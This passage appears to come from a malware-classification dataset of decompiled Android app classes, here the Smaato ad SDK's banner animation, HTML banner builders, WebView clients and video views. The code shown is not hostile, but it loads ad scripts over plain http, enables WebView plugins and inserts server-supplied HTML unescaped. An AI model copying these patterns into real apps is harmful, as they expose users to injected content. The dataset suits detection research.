AnimationSet(true);   if (baseView != null && view != null) {     int[] iArr=new int[2];     baseView.getLocationInWindow(iArr);     Debugger.a(new LogMessage(""BannerAnimator"",""Location in window: "" + iArr[1],1,DebugCategory.DEBUG));     int i2=iArr[1];     view.getLocationInWindow(iArr);     Debugger.a(new LogMessage(""BannerAnimator"",""rootView location in window: "" + iArr[1],1,DebugCategory.WARNING));     TranslateAnimation translateAnimation=new TranslateAnimation(1.0f,1.0f,0.0f,i2 - iArr[1]);     translateAnimation.setDuration(250L);     if (abstractBannerPackage != null) {       ExpandAnimation expandAnimation=new ExpandAnimation(abstractBannerPackage.c(),i,baseView.getHeight());       expandAnimation.setDuration(250L);       animationSet.addAnimation(translateAnimation);       animationSet.addAnimation(expandAnimation);     }   }   return animationSet; }  catch (RuntimeException e) {   throw e; } catch (Exception e2) {   throw new ShrinkAnimationFailed(e2); } } private Animation a(View view,AbstractBannerPackage abstractBannerPackage,BaseView baseView) throws CreatingExpandAnimationFailed { WebView c; try {   Debugger.a(new Object(){   } );   AnimationSet animationSet=new AnimationSet(true);   if (baseView != null && view != null) {     int[] iArr=new int[2];     baseView.getLocationInWindow(iArr);     int i=iArr[1];     view.getLocationInWindow(iArr);     TranslateAnimation translateAnimation=new TranslateAnimation(1.0f,1.0f,i - iArr[1],0.0f);     translateAnimation.setDuration(250L);     if (abstractBannerPackage != null && (c=abstractBannerPackage.c()) != null) {       ExpandAnimation expandAnimation=new ExpandAnimation(c,baseView.getHeight(),view.getHeight());       expandAnimation.setDuration(250L);       animationSet.addAnimation(translateAnimation);       animationSet.addAnimation(expandAnimation);     }   }   return animationSet; }  catch (RuntimeException e) {   throw e; } catch (Exception e2) {   throw new CreatingExpandAnimationFailed(e2); } } public class ExpandAnimation extends Animation { private View b; private int c; private int d; ExpandAnimation(View view,int i,int i2) throws ExpandAnimationInstantiationFailed {   try {     Debugger.a(new LogMessage(""BannerAnimator"",""oldHeight="" + i + "" newHeight=""+ i2,1,DebugCategory.DEBUG));     this.b=view;     this.c=i;     this.d=i2 - i;   }  catch (  RuntimeException e) {     throw e;   } catch (  Exception e2) {     throw new ExpandAnimationInstantiationFailed(e2);   } } @Override protected void applyTransformation(final float f,Transformation transformation){   new CrashReportTemplate<Void>(){     @Override public Void b() throws Exception {       if (ExpandAnimation.this.b != null) {         ExpandAnimation.this.b.getLayoutParams().height=ExpandAnimation.this.c + ((int)(ExpandAnimation.this.d * f));         ExpandAnimation.this.b.requestLayout();         return null;       }       return null;     }   } .c(); } @Override public boolean willChangeBounds(){   return true; } } public final boolean b(){ return this.d; } public final void a(boolean z){ this.d=z; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\ExpandAnimation.code","public class ExpandAnimation extends Animation {   private View b;   private int c;   private int d;   ExpandAnimation(  View view,  int i,  int i2) throws ExpandAnimationInstantiationFailed {     try {       Debugger.a(new LogMessage(""BannerAnimator"",""oldHeight="" + i + "" newHeight=""+ i2,1,DebugCategory.DEBUG));       this.b=view;       this.c=i;       this.d=i2 - i;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ExpandAnimationInstantiationFailed(e2);     }   }   @Override protected void applyTransformation(  final float f,  Transformation transformation){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (ExpandAnimation.this.b != null) {           ExpandAnimation.this.b.getLayoutParams().height=ExpandAnimation.this.c + ((int)(ExpandAnimation.this.d * f));           ExpandAnimation.this.b.requestLayout();           return null;         }         return null;       }     } .c();   }   @Override public boolean willChangeBounds(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\ImageBanner.code","public class ImageBanner extends AbstractBannerPackage {   @Override protected final StringBuffer a(  ReceivedBannerInterface receivedBannerInterface,  int i,  int i2,  boolean z) throws UnableToGenerateImageBanner {     try {       Debugger.a(new Object(){       } );       float k=k();       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(""<html>\n"");       stringBuffer.append(""    <head>\n"");       stringBuffer.append(""        <META name=\""viewport\"" content=\""initial-scale=1.0, user-scalable=no\"" />\n"");       stringBuffer.append(""        <style>body { margin: 0px; padding: 0px;\n"");       stringBuffer.append(""            }\n"");       stringBuffer.append(""        </style>\n"");       stringBuffer.append(""        <script>"");       stringBuffer.append(""             var clicked=false;"");       stringBuffer.append(""             function isClicked(){if(!clicked){clicked = true; return false;}return clicked;}"");       stringBuffer.append(""        </script>"");       stringBuffer.append(""    </head>\n"");       stringBuffer.append(""    <body >\n"");       stringBuffer.append(""    <div >"");       stringBuffer.append(""            <center><img src='"" + receivedBannerInterface.h() + ""' onclick=\""if(!isClicked()){smaato_bridge.legacyExpand(); location.href = '""+ receivedBannerInterface.d()+ ""'; } else{}\"" border='0' vertical-align='top' "");       if (!z && this.a.h()) {         stringBuffer.append(""height=\"""" + ((int)(i2 / k)));       }       stringBuffer.append("" \"" ></center>"");       stringBuffer.append(""    </div>"");       stringBuffer.append(""    </body>\n"");       stringBuffer.append(""</html>\n"");       return stringBuffer;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToGenerateImageBanner(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\InternalWebViewClient.code","public class InternalWebViewClient extends WebViewClient {   final LoadingState a;   private InternalWebViewClient(  LoadingState loadingState){     this.a=loadingState;   }   InternalWebViewClient(  AbstractBannerPackage abstractBannerPackage,  LoadingState loadingState,  InternalWebViewClient internalWebViewClient){     this(loadingState);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  final String str){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         Debugger.a(new LogMessage(AbstractBannerPackage.TAG,""Requested url: "" + str,1,DebugCategory.ERROR));         return false;       }     } .c().booleanValue();   }   @Override public void onPageFinished(  final WebView webView,  String str){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         webView.setWebViewClient(new WebViewClient());         Debugger.a(new LogMessage(AbstractBannerPackage.TAG,""Page Finished Loading..."",1,DebugCategory.DEBUG));         InternalWebViewClient.this.a.e();         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\RichMediaBanner.code","public class RichMediaBanner extends AbstractBannerPackage {   private boolean b=false;   @Override protected final StringBuffer a(  ReceivedBannerInterface receivedBannerInterface,  int i,  int i2,  boolean z) throws UnableToGenerateRichMediaBanner {     try {       Debugger.a(new Object(){       } );       b(true);       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(""<html>\n"");       stringBuffer.append(""    <head>\n"");       stringBuffer.append(""        <META name=\""viewport\"" content=\""user-scalable=no\"" />\n"");       stringBuffer.append(""    </head>\n"");       stringBuffer.append(""<body align=\""center\"" onClick=\""smaato_bridge.legacyExpand();\"">\n"");       stringBuffer.append(""    <script src=\""http://soma.smaato.net/oapi/js/ormma_bridge.js\"" type=\""text/javascript\""></script>\n"");       stringBuffer.append(""    <script src=\""http://soma.smaato.net/oapi/js/ormma.js\"" type=\""text/javascript\""></script>\n"");       stringBuffer.append(""    <div id=\""ad-container\"">"");       ReceivedBanner c=DummyConnector.b().c();       if (c != null && c.c() != null) {         stringBuffer.append(c.c());       }  else {         stringBuffer.append(receivedBannerInterface.c());       }       stringBuffer.append(""    </div>"");       stringBuffer.append(""</body>"");       stringBuffer.append(""</html>\n"");       return stringBuffer;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToGenerateRichMediaBanner(e2);     }   }   public final void b(  boolean z){     this.b=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\SDK7PlusSetter.code","private class SDK7PlusSetter implements WebSettingsSetter {   private SDK7PlusSetter(){   }   SDK7PlusSetter(  AbstractBannerPackage abstractBannerPackage,  SDK7PlusSetter sDK7PlusSetter){     this();   }   SDK7PlusSetter(  AbstractBannerPackage abstractBannerPackage,  SDK7PlusSetter sDK7PlusSetter,  SDK7PlusSetter sDK7PlusSetter2){     this();   }   @Override public void a(  WebSettings webSettings) throws UnableToApplySDKSettings {     webSettings.setLoadWithOverviewMode(true);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\SDK8PlusSetter.code","private class SDK8PlusSetter extends SDK7PlusSetter implements WebSettingsSetter {   private SDK8PlusSetter(){     super(AbstractBannerPackage.this,null);   }   SDK8PlusSetter(  AbstractBannerPackage abstractBannerPackage,  SDK8PlusSetter sDK8PlusSetter){     this();   }   @Override public void a(  WebSettings webSettings) throws UnableToApplySDKSettings {     try {       super.a(webSettings);       webSettings.setPluginState(WebSettings.PluginState.ON);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToApplySDKSettings(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\TextBanner.code","public class TextBanner extends AbstractBannerPackage {   private final String b=""\n"";   private final String c=""margin: 0px;\n"";   private final String d=""             padding: 0px;\n"";   private final String e=""             white-space: nowrap;\n"";   private final String f=""     <script>\n"";   private final String g=""         }\n"";   @Override protected StringBuffer a(  ReceivedBannerInterface receivedBannerInterface,  int i,  int i2,  boolean z) throws UnableToGenerateTextBanner {     StringBuffer stringBuffer=new StringBuffer();     try {       Debugger.a(new Object(){       } );       stringBuffer.append(""<html>\n"");       stringBuffer.append(""    <head>\n"");       stringBuffer.append(""        <style type=\""text/css\"">\n"");       stringBuffer.append(""         body {\n"");       stringBuffer.append(""             height:100%;"");       stringBuffer.append(""             background: #f2f5f0; /* Old browsers */\n"");       stringBuffer.append(""             background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#f2f5f0), color-stop(18%,#e9ece7), color-stop(71%,#bdc1bb), color-stop(94%,#aeb2ab), color-stop(100%,#acb0a9)); /* Chrome,Safari4+ */\n"");       stringBuffer.append(""             background: -webkit-linear-gradient(top, #f2f5f0 0%,#e9ece7 18%,#bdc1bb 71%,#aeb2ab 94%,#acb0a9 100%); /* Chrome10+,Safari5.1+ */\n"");       stringBuffer.append(""             background: linear-gradient(top, #f2f5f0 0%,#e9ece7 18%,#bdc1bb 71%,#aeb2ab 94%,#acb0a9 100%); /* W3C */\n"");       stringBuffer.append(""         }\n"");       stringBuffer.append(""        </style>\n"");       stringBuffer.append(""     <script>\n"");       stringBuffer.append(""            function openLink() {\n"");       stringBuffer.append(""                document.body.style.height = \""auto\""\n"");       stringBuffer.append(""                smaato_bridge.legacyExpand();\n"");       stringBuffer.append(""                document.location='"" + receivedBannerInterface.d() + ""';\n"");       stringBuffer.append(""            }\n"");       stringBuffer.append(""     </script>\n"");       stringBuffer.append(""     <script>\n"");       stringBuffer.append(""                         var clicked=false;"");       stringBuffer.append(""                         function isClicked(){if(!clicked){clicked = true; return false;}return clicked;}"");       stringBuffer.append(""     </script>\n"");       stringBuffer.append(""    </head>\n"");       stringBuffer.append(""    <body align=\""center\"" onclick=\""if(!isClicked()){openLink(); } else{}\"">\n"");       stringBuffer.append(""        <table align=\""center\"" border=\""0\"" height=\""100%\"" width=\""100%\""> <tr>\n"");       stringBuffer.append(receivedBannerInterface.g());       stringBuffer.append(""       </tr> </table>\n"");       stringBuffer.append(""    </body>\n"");       stringBuffer.append(""</html>\n"");       return stringBuffer;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToGenerateTextBanner(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\VideoBanner.code","public class VideoBanner extends AbstractBannerPackage {   @Override protected StringBuffer a(  ReceivedBannerInterface receivedBannerInterface,  int i,  int i2,  boolean z){     return new StringBuffer("""");   }   public void a(  BaseView baseView) throws VideoViewInstantiationException {     try {       Debugger.a(new Object(){       } );       VideoChrome videoChrome=new VideoChrome(this);       videoChrome.getClass();       a(new VideoChrome.VideoSubView());       i().a(baseView,d().f(),d().d());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new VideoViewInstantiationException(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\VideoChrome.code","public class VideoChrome {   private static final String TAG=""Banner Client"";   AbstractBannerPackage a;   public VideoChrome(  AbstractBannerPackage abstractBannerPackage){     this.a=abstractBannerPackage;   }   public VideoChromeClient a(){     if (Build.VERSION.SDK_INT >= 7) {       return new VideoChromeClientImpl();     }     return new VideoChromeClient();   }   public Context b() throws VideoChromeContextFailed {     try {       return this.a.f();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new VideoChromeContextFailed(e2);     }   } public class VideoSubView implements MediaPlayer.OnCompletionListener, MediaPlayer.OnErrorListener {     private VideoView b=null;     private FrameLayout c=null;     public VideoSubView(){     }     private FrameLayout a(    View view) throws VideoRootViewNotFoundException {       try {         Debugger.a(new Object(){         } );         return (FrameLayout)view.getRootView().findViewById(R.id.content);       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new VideoRootViewNotFoundException(e2);       }     }     public String a(    String str){       return ""Opening URL "" + str + "" in external browser."";     }     public void a() throws ClosingVideoFailed {       try {         Debugger.a(new Object(){         } );         Debugger.a(new LogMessage(""VideoSubView"",""closeVideo"",1,DebugCategory.DEBUG));         if (this.b != null) {           this.b.stopPlayback();           this.c.removeView(this.b);           this.b=null;         }       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new ClosingVideoFailed(e2);       }     }     public void a(    View view,    String str,    final String str2) throws StartingVideoFailedException {       try {         Debugger.a(new Object(){         } );         this.b=new VideoView(VideoChrome.this.b());         this.c=a(view);         this.c.addView(this.b);         this.b.setVideoURI(Uri.parse(str));         this.b.setOnCompletionListener(this);         this.b.setOnErrorListener(this);         this.b.setOnKeyListener(new View.OnKeyListener(){           @Override public boolean onKey(          final View view2,          final int i,          final KeyEvent keyEvent){             return new CrashReportTemplate<Boolean>(){               @Override public Boolean b() throws Exception {                 if (view2 == null) {                   return false;                 }                 if (i == 4 && keyEvent.getAction() == 1) {                   Debugger.a(new LogMessage(""VideoTest"",""Back key pressed"",1,DebugCategory.DEBUG));                   VideoSubView.this.a();                   return true;                 }                 return false;               }             } .c().booleanValue();           }         } );         this.b.setOnPreparedListener(new MediaPlayer.OnPreparedListener(){           @Override public void onPrepared(          final MediaPlayer mediaPlayer){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 mediaPlayer.start();                 return null;               }             } .c();           }         } );         view.setOnClickListener(new View.OnClickListener(){           @Override public void onClick(          View view2){             final String str3=str2;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 Debugger.a(new LogMessage(VideoChrome.TAG,VideoSubView.this.a(str3),1,DebugCategory.DEBUG));                 VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str3)));                 return null;               }             } .c();           }         } );         this.b.setOnTouchListener(new View.OnTouchListener(){           @Override public boolean onTouch(          View view2,          final MotionEvent motionEvent){             final String str3=str2;             return new CrashReportTemplate<Boolean>(){               @Override public Boolean b() throws Exception {                 if (motionEvent.getAction() == 1) {                   Debugger.a(new LogMessage(VideoChrome.TAG,VideoSubView.this.a(str3),1,DebugCategory.DEBUG));                   VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str3)));                 }                 return false;               }             } .c().booleanValue();           }         } );         this.b.requestFocus();       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new StartingVideoFailedException(e2);       }     }     @Override public boolean onError(    MediaPlayer mediaPlayer,    int i,    int i2){       return new CrashReportTemplate<Boolean>(){         @Override public Boolean b() throws Exception {           VideoSubView.this.a();           return false;         }       } .c().booleanValue();     }     @Override public void onCompletion(    MediaPlayer mediaPlayer){       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           VideoSubView.this.a();           return null;         }       } .c();     }   } public class VideoChromeClient extends WebChromeClient {     VideoChromeClient(){     }     public void a() throws ClosingVideoChromeFailedException {     }   } public class VideoChromeClientImpl extends VideoChromeClient implements MediaPlayer.OnCompletionListener, MediaPlayer.OnErrorListener {     private static final int PROGRESS_COMPLETE=100;     private WebChromeClient.CustomViewCallback c;     private VideoView d;     private FrameLayout e;     VideoChromeClientImpl(){       super();       this.c=null;       this.d=null;       this.e=null;     }     public FrameLayout a(    View view) throws UnableToFindRootLayout {       try {         Debugger.a(new Object(){         } );         return (FrameLayout)view.getRootView().findViewById(R.id.content);       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new UnableToFindRootLayout(e2);       }     }     @Override public void a() throws ClosingVideoChromeFailedException {       try {         Debugger.a(new Object(){         } );         if (this.d != null) {           Debugger.a(new LogMessage(""VideoChromeClient"",""closeVideo"",1,DebugCategory.DEBUG));           this.d.stopPlayback();           this.e.removeView(this.d);           this.c.onCustomViewHidden();           this.d=null;         }       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new ClosingVideoChromeFailedException(e2);       }     }     @Override public void onShowCustomView(    View view,    WebChromeClient.CustomViewCallback customViewCallback){       Debugger.a(new Object(){       } );       super.onShowCustomView(view,customViewCallback);       new AnonymousClass4(customViewCallback,view,this).c();     } public class AnonymousClass4 extends CrashReportTemplate<Void> {       private final WebChromeClient.CustomViewCallback b;       private final View c;       private final VideoChromeClientImpl d;       AnonymousClass4(      WebChromeClient.CustomViewCallback customViewCallback,      View view,      VideoChromeClientImpl videoChromeClientImpl){         this.b=customViewCallback;         this.c=view;         this.d=videoChromeClientImpl;       }       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(VideoChrome.TAG,""onShowCustomView()"",1,DebugCategory.ERROR));         VideoChromeClientImpl.this.c=this.b;         if (this.c instanceof FrameLayout) {           FrameLayout frameLayout=(FrameLayout)this.c;           if (frameLayout.getFocusedChild() instanceof VideoView) {             VideoChromeClientImpl.this.d=(VideoView)frameLayout.getFocusedChild();             frameLayout.removeView(VideoChromeClientImpl.this.d);             VideoChromeClientImpl.this.e=VideoChromeClientImpl.this.a(VideoChromeClientImpl.this.b());             VideoChromeClientImpl.this.e.addView(VideoChromeClientImpl.this.d);             VideoChromeClientImpl.this.d.setOnCompletionListener(this.d);             VideoChromeClientImpl.this.d.setOnErrorListener(this.d);             VideoChromeClientImpl.this.d.setOnKeyListener(new View.OnKeyListener(){               @Override public boolean onKey(              final View view,              final int i,              final KeyEvent keyEvent){                 return new CrashReportTemplate<Boolean>(){                   @Override public Boolean b() throws Exception {                     if (view == null) {                       return false;                     }                     if (i == 4 && keyEvent.getAction() == 1) {                       Debugger.a(new LogMessage(""VideoTest"",""Back key pressed"",1,DebugCategory.DEBUG));                       VideoChromeClientImpl.this.a();                       return true;                     }                     return false;                   }                 } .c().booleanValue();               }             } );             VideoChromeClientImpl.this.d.start();             return null;           }           return null;         }         return null;       }     }     public View b() throws UnableToGetVideoView {       try {         return VideoChrome.this.a.c();       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new UnableToGetVideoView(e2);       }     }     @Override public void onCompletion(    MediaPlayer mediaPlayer){       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           VideoChromeClientImpl.this.a();           return null;         }       } .c();     }     @Override public boolean onError(    MediaPlayer mediaPlayer,    int i,    int i2){       return new CrashReportTemplate<Boolean>(){         @Override public Boolean b() throws Exception {           VideoChromeClientImpl.this.e.removeView(VideoChromeClientImpl.this.d);           VideoChromeClientImpl.this.c.onCustomViewHidden();           return false;         }       } .c().booleanValue();     }     @Override public boolean onJsAlert(    WebView webView,    String str,    String str2,    JsResult jsResult){       Debugger.a(new LogMessage(""Javascript"",""JSAlert "" + str2,1,DebugCategory.INFO));       return super.onJsAlert(webView,str,str2,jsResult);     }     @Override public void onCloseWindow(    WebView webView){       super.onCloseWindow(webView);     }     @Override public void onProgressChanged(    final WebView webView,    final int i){       super.onProgressChanged(webView,i);       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           if (i != 100) {             if (VideoChrome.this.a.a.getBannerState().a() == BannerState.State.STATE_BANNEREXPANDED && ProgressBar.a().c() && !VideoChrome.this.a.e()) {               ProgressBar.a().a(VideoChrome.this.b());               ProgressBar.a().a(i);               return null;             }             ProgressBar.a().a(i);             return null;           }           VideoChromeClientImpl.this.a(webView.getUrl());           ProgressBar.a().b();           return null;         }       } .c();     }     public boolean a(    String str) throws GooglePlayUrlParsingException {       try {         Debugger.a(new Object(){         } );         if (str == null) {           return false;         }         if ((!str.contains(""play.google.com"") && (!str.contains(""market://"") || !str.contains(""details?""))) || BannerAnimator.a().b()) {           return false;         }         StringBuffer stringBuffer=new StringBuffer(""market://details?"");         stringBuffer.append(str.split(""details\\?"")[1]);         VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(stringBuffer.toString())));         VideoChrome.this.a.j();         return true;       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new GooglePlayUrlParsingException(e2);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\VideoChromeClient.code","public class VideoChromeClient extends WebChromeClient {   VideoChromeClient(){   }   public void a() throws ClosingVideoChromeFailedException {   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\VideoChromeClientImpl.code","public class VideoChromeClientImpl extends VideoChromeClient implements MediaPlayer.OnCompletionListener, MediaPlayer.OnErrorListener {   private static final int PROGRESS_COMPLETE=100;   private WebChromeClient.CustomViewCallback c;   private VideoView d;   private FrameLayout e;   VideoChromeClientImpl(){     super();     this.c=null;     this.d=null;     this.e=null;   }   public FrameLayout a(  View view) throws UnableToFindRootLayout {     try {       Debugger.a(new Object(){       } );       return (FrameLayout)view.getRootView().findViewById(R.id.content);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToFindRootLayout(e2);     }   }   @Override public void a() throws ClosingVideoChromeFailedException {     try {       Debugger.a(new Object(){       } );       if (this.d != null) {         Debugger.a(new LogMessage(""VideoChromeClient"",""closeVideo"",1,DebugCategory.DEBUG));         this.d.stopPlayback();         this.e.removeView(this.d);         this.c.onCustomViewHidden();         this.d=null;       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ClosingVideoChromeFailedException(e2);     }   }   @Override public void onShowCustomView(  View view,  WebChromeClient.CustomViewCallback customViewCallback){     Debugger.a(new Object(){     } );     super.onShowCustomView(view,customViewCallback);     new AnonymousClass4(customViewCallback,view,this).c();   } public class AnonymousClass4 extends CrashReportTemplate<Void> {     private final WebChromeClient.CustomViewCallback b;     private final View c;     private final VideoChromeClientImpl d;     AnonymousClass4(    WebChromeClient.CustomViewCallback customViewCallback,    View view,    VideoChromeClientImpl videoChromeClientImpl){       this.b=customViewCallback;       this.c=view;       this.d=videoChromeClientImpl;     }     @Override public Void b() throws Exception {       Debugger.a(new LogMessage(VideoChrome.TAG,""onShowCustomView()"",1,DebugCategory.ERROR));       VideoChromeClientImpl.this.c=this.b;       if (this.c instanceof FrameLayout) {         FrameLayout frameLayout=(FrameLayout)this.c;         if (frameLayout.getFocusedChild() instanceof VideoView) {           VideoChromeClientImpl.this.d=(VideoView)frameLayout.getFocusedChild();           frameLayout.removeView(VideoChromeClientImpl.this.d);           VideoChromeClientImpl.this.e=VideoChromeClientImpl.this.a(VideoChromeClientImpl.this.b());           VideoChromeClientImpl.this.e.addView(VideoChromeClientImpl.this.d);           VideoChromeClientImpl.this.d.setOnCompletionListener(this.d);           VideoChromeClientImpl.this.d.setOnErrorListener(this.d);           VideoChromeClientImpl.this.d.setOnKeyListener(new View.OnKeyListener(){             @Override public boolean onKey(            final View view,            final int i,            final KeyEvent keyEvent){               return new CrashReportTemplate<Boolean>(){                 @Override public Boolean b() throws Exception {                   if (view == null) {                     return false;                   }                   if (i == 4 && keyEvent.getAction() == 1) {                     Debugger.a(new LogMessage(""VideoTest"",""Back key pressed"",1,DebugCategory.DEBUG));                     VideoChromeClientImpl.this.a();                     return true;                   }                   return false;                 }               } .c().booleanValue();             }           } );           VideoChromeClientImpl.this.d.start();           return null;         }         return null;       }       return null;     }   }   public View b() throws UnableToGetVideoView {     try {       return VideoChrome.this.a.c();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToGetVideoView(e2);     }   }   @Override public void onCompletion(  MediaPlayer mediaPlayer){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoChromeClientImpl.this.a();         return null;       }     } .c();   }   @Override public boolean onError(  MediaPlayer mediaPlayer,  int i,  int i2){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         VideoChromeClientImpl.this.e.removeView(VideoChromeClientImpl.this.d);         VideoChromeClientImpl.this.c.onCustomViewHidden();         return false;       }     } .c().booleanValue();   }   @Override public boolean onJsAlert(  WebView webView,  String str,  String str2,  JsResult jsResult){     Debugger.a(new LogMessage(""Javascript"",""JSAlert "" + str2,1,DebugCategory.INFO));     return super.onJsAlert(webView,str,str2,jsResult);   }   @Override public void onCloseWindow(  WebView webView){     super.onCloseWindow(webView);   }   @Override public void onProgressChanged(  final WebView webView,  final int i){     super.onProgressChanged(webView,i);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (i != 100) {           if (VideoChrome.this.a.a.getBannerState().a() == BannerState.State.STATE_BANNEREXPANDED && ProgressBar.a().c() && !VideoChrome.this.a.e()) {             ProgressBar.a().a(VideoChrome.this.b());             ProgressBar.a().a(i);             return null;           }           ProgressBar.a().a(i);           return null;         }         VideoChromeClientImpl.this.a(webView.getUrl());         ProgressBar.a().b();         return null;       }     } .c();   }   public boolean a(  String str) throws GooglePlayUrlParsingException {     try {       Debugger.a(new Object(){       } );       if (str == null) {         return false;       }       if ((!str.contains(""play.google.com"") && (!str.contains(""market://"") || !str.contains(""details?""))) || BannerAnimator.a().b()) {         return false;       }       StringBuffer stringBuffer=new StringBuffer(""market://details?"");       stringBuffer.append(str.split(""details\\?"")[1]);       VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(stringBuffer.toString())));       VideoChrome.this.a.j();       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GooglePlayUrlParsingException(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\VideoSubView.code","public class VideoSubView implements MediaPlayer.OnCompletionListener, MediaPlayer.OnErrorListener {   private VideoView b=null;   private FrameLayout c=null;   public VideoSubView(){   }   private FrameLayout a(  View view) throws VideoRootViewNotFoundException {     try {       Debugger.a(new Object(){       } );       return (FrameLayout)view.getRootView().findViewById(R.id.content);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new VideoRootViewNotFoundException(e2);     }   }   public String a(  String str){     return ""Opening URL "" + str + "" in external browser."";   }   public void a() throws ClosingVideoFailed {     try {       Debugger.a(new Object(){       } );       Debugger.a(new LogMessage(""VideoSubView"",""closeVideo"",1,DebugCategory.DEBUG));       if (this.b != null) {         this.b.stopPlayback();         this.c.removeView(this.b);         this.b=null;       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ClosingVideoFailed(e2);     }   }   public void a(  View view,  String str,  final String str2) throws StartingVideoFailedException {     try {       Debugger.a(new Object(){       } );       this.b=new VideoView(VideoChrome.this.b());       this.c=a(view);       this.c.addView(this.b);       this.b.setVideoURI(Uri.parse(str));       this.b.setOnCompletionListener(this);       this.b.setOnErrorListener(this);       this.b.setOnKeyListener(new View.OnKeyListener(){         @Override public boolean onKey(        final View view2,        final int i,        final KeyEvent keyEvent){           return new CrashReportTemplate<Boolean>(){             @Override public Boolean b() throws Exception {               if (view2 == null) {                 return false;               }               if (i == 4 && keyEvent.getAction() == 1) {                 Debugger.a(new LogMessage(""VideoTest"",""Back key pressed"",1,DebugCategory.DEBUG));                 VideoSubView.this.a();                 return true;               }               return false;             }           } .c().booleanValue();         }       } );       this.b.setOnPreparedListener(new MediaPlayer.OnPreparedListener(){         @Override public void onPrepared(        final MediaPlayer mediaPlayer){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               mediaPlayer.start();               return null;             }           } .c();         }       } );       view.setOnClickListener(new View.OnClickListener(){         @Override public void onClick(        View view2){           final String str3=str2;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               Debugger.a(new LogMessage(VideoChrome.TAG,VideoSubView.this.a(str3),1,DebugCategory.DEBUG));               VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str3)));               return null;             }           } .c();         }       } );       this.b.setOnTouchListener(new View.OnTouchListener(){         @Override public boolean onTouch(        View view2,        final MotionEvent motionEvent){           final String str3=str2;           return new CrashReportTemplate<Boolean>(){             @Override public Boolean b() throws Exception {               if (motionEvent.getAction() == 1) {                 Debugger.a(new 